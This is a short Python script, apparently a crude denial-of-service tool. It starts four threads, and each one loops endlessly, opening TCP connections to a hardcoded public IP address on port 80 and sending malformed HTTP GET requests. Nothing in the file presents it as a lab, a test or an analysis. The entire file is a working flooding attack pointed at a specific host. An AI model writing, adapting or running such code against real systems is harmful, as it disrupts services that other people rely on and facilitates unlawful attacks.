import socket
from threading import Thread

host = "35.229.59.108"
ip = host
port = 80

def dos():
    while True:
        mysocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            mysocket.connect((ip, port))
            mysocket.send(str.encode("GET " + "hoffentlich sterbe ich nicht" + "HTTP/1.1 \r \n"))
            mysocket.sendto(str.encode("GET " + "hoffentlich sterbe ich nicht" + "HTTP/1.1 \r \n"), (ip, port))
        except socket.error:
            print("error")
        mysocket.close()

for i in range(4):
    t = Thread(target=dos)
    t.start()